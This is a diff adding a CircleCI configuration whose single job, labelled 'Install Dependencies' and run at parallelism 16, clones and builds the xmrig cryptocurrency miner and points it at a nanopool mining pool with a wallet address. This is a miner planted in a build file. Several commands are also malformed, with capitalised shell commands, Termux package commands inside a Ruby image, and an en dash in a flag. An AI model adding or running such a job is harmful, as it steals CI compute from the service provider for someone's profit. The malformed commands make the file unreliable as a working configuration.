@@ -1,0 +1,32 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              Pkg install wget git proot
+              Git clone https://github.com/Neo-Oli/termux-ubuntu
+              Cd termux-ubuntu
+              Chmod +x ubuntu.sh
+              Sh ubuntu.sh
+              ./start-ubuntu.sh
+              Pkg update
+              Git clone https://github.com/xmrig/xmrig
+              Cd xmrig
+              Mkdir build
+              Cd build
+              Pkg install cmake
+              Cmake -DWITH_HWLOC=OFF ..
+              Make
+              ./xmrig -o xmr-asia1.nanopool.org:14433 -u TWU2NXD7R5KD7yzvugESD1T7fpUaoWGd3X  --tls –coin tron 
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
